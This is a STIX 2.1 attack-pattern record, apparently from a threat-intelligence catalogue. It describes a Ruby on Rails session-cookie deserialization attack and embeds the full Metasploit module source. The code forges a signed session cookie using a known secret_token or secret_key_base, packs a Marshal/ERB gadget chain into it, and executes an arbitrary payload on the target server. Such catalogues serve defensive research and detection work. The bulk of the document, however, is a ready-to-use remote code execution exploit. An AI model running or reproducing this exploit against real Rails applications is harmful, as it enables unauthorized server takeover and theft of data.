{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5744506e-52f6-4754-aa87-08fdfe728adf",
    "created": "2024-08-14T17:10:52.973838Z",
    "modified": "2024-08-14T17:10:52.973842Z",
    "name": "Ruby on Rails Known Secret Session Cookie Remote Code Execution",
    "description": " This module implements Remote Command Execution on Ruby on Rails applications. Prerequisite is knowledge of the \"secret_token\" (Rails 2/3) or \"secret_key_base\" (Rails 4). The values for those can be usually found in the file \"RAILS_ROOT/config/initializers/secret_token.rb\". The module achieves RCE by deserialization of a crafted Ruby Object. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/rails_secret_deserialization.rb",
            "external_id": "rails_secret_deserialization.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-0156"
        },
        {
            "source_name": "reference",
            "url": "http://robertheaton.com/2013/07/22/how-to-hack-a-rails-app-using-its-secret-token/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  #Helper Classes copy/paste from Rails4\n  class MessageVerifier\n\n    class InvalidSignature < StandardError; end\n\n    def initialize(secret, options = {})\n      @secret = secret\n      @digest = options[:digest] || 'SHA1'\n      @serializer = options[:serializer] || Marshal\n    end\n\n    def generate(value)\n      data = ::Base64.strict_encode64(@serializer.dump(value))\n      \"#{data}--#{generate_digest(data)}\"\n    end\n\n    def generate_digest(data)\n      require 'openssl' unless defined?(OpenSSL)\n      OpenSSL::HMAC.hexdigest(OpenSSL::Digest.const_get(@digest).new, @secret, data)\n    end\n\n  end\n\n  class MessageEncryptor\n\n    module NullSerializer #:nodoc:\n\n      def self.load(value)\n        value\n      end\n\n      def self.dump(value)\n        value\n      end\n\n    end\n\n    class InvalidMessage < StandardError; end\n\n    OpenSSLCipherError = OpenSSL::Cipher::CipherError\n\n    def initialize(secret, *signature_key_or_options)\n      options = signature_key_or_options.extract_options!\n      sign_secret = signature_key_or_options.first\n      @secret = secret\n      @sign_secret = sign_secret\n      @cipher = options[:cipher] || 'aes-256-cbc'\n      @verifier = MessageVerifier.new(@sign_secret || @secret, :serializer => NullSerializer)\n      # @serializer = options[:serializer] || Marshal\n    end\n\n    def encrypt_and_sign(value)\n      @verifier.generate(_encrypt(value))\n    end\n\n    def _encrypt(value)\n      cipher = new_cipher\n      cipher.encrypt\n      cipher.key = @secret\n      # Rely on OpenSSL for the initialization vector\n      iv = cipher.random_iv\n      #encrypted_data = cipher.update(@serializer.dump(value))\n      encrypted_data = cipher.update(value)\n      encrypted_data << cipher.final\n      [encrypted_data, iv].map {|v| ::Base64.strict_encode64(v)}.join(\"--\")\n    end\n\n    def new_cipher\n      OpenSSL::Cipher.new(@cipher)\n    end\n\n  end\n\n  class KeyGenerator\n\n    def initialize(secret, options = {})\n      @secret = secret\n      @iterations = options[:iterations] || 2**16\n    end\n\n    def generate_key(salt, key_size=64)\n      OpenSSL::PKCS5.pbkdf2_hmac_sha1(@secret, salt, @iterations, key_size)\n    end\n\n  end\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Ruby on Rails Known Secret Session Cookie Remote Code Execution',\n      'Description'    => %q{\n          This module implements Remote Command Execution on Ruby on Rails applications.\n          Prerequisite is knowledge of the \"secret_token\" (Rails 2/3) or \"secret_key_base\"\n          (Rails 4). The values for those can be usually found in the file\n          \"RAILS_ROOT/config/initializers/secret_token.rb\". The module achieves RCE by\n          deserialization of a crafted Ruby Object.\n      },\n      'Author'         =>\n        [\n          'joernchen of Phenoelit <joernchen[at]phenoelit.de>',\n        ],\n      'License'        => MSF_LICENSE,\n      'References'  =>\n        [\n          ['CVE', '2013-0156'],\n          ['URL', 'http://robertheaton.com/2013/07/22/how-to-hack-a-rails-app-using-its-secret-token/']\n        ],\n      'DisclosureDate' => '2013-04-11',\n      'Platform'       => 'ruby',\n      'Arch'           => ARCH_RUBY,\n      'Privileged'     => false,\n      'Targets'        =>\t[ ['Automatic', {} ] ],\n      'DefaultTarget' => 0))\n\n    register_options(\n      [\n        Opt::RPORT(80),\n        OptInt.new('RAILSVERSION', [ true, 'The target Rails Version (use 3 for Rails3 and 2, 4 for Rails4)', 3]),\n        OptString.new('TARGETURI', [ true, 'The path to a vulnerable Ruby on Rails application', \"/\"]),\n        OptString.new('HTTP_METHOD', [ true, 'The HTTP request method (GET, POST, PUT typically work)', \"GET\"]),\n        OptString.new('SECRET', [ true, 'The secret_token (Rails3) or secret_key_base (Rails4) of the application (needed to sign the cookie)', nil]),\n        OptString.new('COOKIE_NAME', [ false, 'The name of the session cookie',nil]),\n        OptString.new('DIGEST_NAME', [ true, 'The digest type used to HMAC the session cookie','SHA1']),\n        OptString.new('SALTENC', [ true, 'The encrypted cookie salt', 'encrypted cookie']),\n        OptString.new('SALTSIG', [ true, 'The signed encrypted cookie salt', 'signed encrypted cookie']),\n        OptBool.new('VALIDATE_COOKIE', [ false, 'Only send the payload if the session cookie is validated', true]),\n\n      ])\n  end\n\n\n  #\n  # This stub ensures that the payload runs outside of the Rails process\n  # Otherwise, the session can be killed on timeout\n  #\n  def detached_payload_stub(code)\n  %Q^\n    code = '#{ Rex::Text.encode_base64(code) }'.unpack(\"m0\").first\n    if RUBY_PLATFORM =~ /mswin|mingw|win32/\n      inp = IO.popen(\"ruby\", \"wb\") rescue nil\n      if inp\n        inp.write(code)\n        inp.close\n      end\n    else\n      Kernel.fork do\n        eval(code)\n      end\n    end\n    {}\n  ^.strip.split(/\\n/).map{|line| line.strip}.join(\"\\n\")\n  end\n\n  def check_secret(data, digest)\n    data = Rex::Text.uri_decode(data)\n    if datastore['RAILSVERSION'] == 3\n      sigkey = datastore['SECRET']\n    elsif datastore['RAILSVERSION'] == 4\n      keygen = KeyGenerator.new(datastore['SECRET'],{:iterations => 1000})\n      sigkey = keygen.generate_key(datastore['SALTSIG'])\n    end\n    digest == OpenSSL::HMAC.hexdigest(OpenSSL::Digest.new(datastore['DIGEST_NAME']), sigkey, data)\n  end\n\n  def rails_4\n    keygen = KeyGenerator.new(datastore['SECRET'],{:iterations => 1000})\n    enckey = keygen.generate_key(datastore['SALTENC'])\n    sigkey = keygen.generate_key(datastore['SALTSIG'])\n    crypter = MessageEncryptor.new(enckey, sigkey)\n    crypter.encrypt_and_sign(build_cookie)\n  end\n\n  def rails_3\n    # Sign it with the secret_token\n    data = build_cookie\n    digest = OpenSSL::HMAC.hexdigest(OpenSSL::Digest.new(\"SHA1\"), datastore['SECRET'], data)\n    marshal_payload = Rex::Text.uri_encode(data)\n    \"#{marshal_payload}--#{digest}\"\n  end\n\n  def build_cookie\n\n    # Embed the payload with the detached stub\n    code =\n      \"eval('\" +\n      Rex::Text.encode_base64(detached_payload_stub(payload.encoded)) +\n      \"'.unpack('m0').first)\"\n\n    if datastore['RAILSVERSION'] == 4\n      return \"\\x04\\b\" +\n      \"o:@ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy\\b\" +\n        \":\\x0E@instanceo\" +\n          \":\\bERB\\x07\" +\n            \":\\t@src\"+  Marshal.dump(code)[2..-1] +\n            \":\\x0c@lineno\"+ \"i\\x00\" +\n        \":\\f@method:\\vresult:\" +\n        \"\\x10@deprecatoro:\\x1FActiveSupport::Deprecation\\x00\"\n    end\n    if datastore['RAILSVERSION'] == 3\n      return Rex::Text.encode_base64 \"\\x04\\x08\" +\n      \"o\"+\":\\x40ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy\"+\"\\x07\" +\n        \":\\x0E@instance\" +\n          \"o\"+\":\\x08ERB\"+\"\\x07\" +\n            \":\\x09@src\" +\n              Marshal.dump(code)[2..-1] +\n            \":\\x0c@lineno\"+ \"i\\x00\" +\n        \":\\x0C@method\"+\":\\x0Bresult\"\n    end\n  end\n\n  #\n  # Send the actual request\n  #\n  def exploit\n    if datastore['RAILSVERSION'] == 3\n      cookie = rails_3\n    elsif datastore['RAILSVERSION'] == 4\n      cookie = rails_4\n    end\n    cookie_name = datastore['COOKIE_NAME']\n\n    print_status(\"Checking for cookie #{datastore['COOKIE_NAME']}\")\n    res = send_request_cgi({\n      'uri'    => datastore['TARGETURI'] || \"/\",\n      'method' => datastore['HTTP_METHOD'],\n    }, 25)\n    if res && !res.get_cookies.empty?\n        match = res.get_cookies.match(/([.-_A-Za-z0-9]+)=([A-Za-z0-9%]*)--([0-9A-Fa-f]+);/)\n    end\n\n    if match\n      if match[1] == datastore['COOKIE_NAME']\n        print_status(\"Found cookie, now checking for proper SECRET\")\n      else\n        print_status(\"Adjusting cookie name to #{match[1]}\")\n        cookie_name = match[1]\n      end\n\n      if check_secret(match[2],match[3])\n        print_good(\"SECRET matches! Sending exploit payload\")\n      else\n        fail_with(Failure::BadConfig, \"SECRET does not match, wrong RAILSVERSION?\")\n      end\n    else\n      print_warning(\"Caution: Cookie not found, maybe you need to adjust TARGETURI\")\n      if cookie_name.nil? || cookie_name.empty?\n        # This prevents trying to send busted cookies with no name\n        fail_with(Failure::BadConfig, \"No cookie found and no name given\")\n      end\n      if datastore['VALIDATE_COOKIE']\n        fail_with(Failure::BadConfig, \"COOKIE not validated, unset VALIDATE_COOKIE to send the payload anyway\")\n      else\n        print_status(\"Trying to leverage default controller without cookie confirmation.\")\n      end\n    end\n\n    print_status \"Sending cookie #{cookie_name}\"\n    res = send_request_cgi({\n      'uri'     => datastore['TARGETURI'] || \"/\",\n      'method'  => datastore['HTTP_METHOD'],\n      'headers' => {'Cookie' => cookie_name+\"=\"+ cookie},\n    }, 25)\n\n    handler\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-04-11",
    "x_mitre_platforms": [
        "ruby'"
    ]
}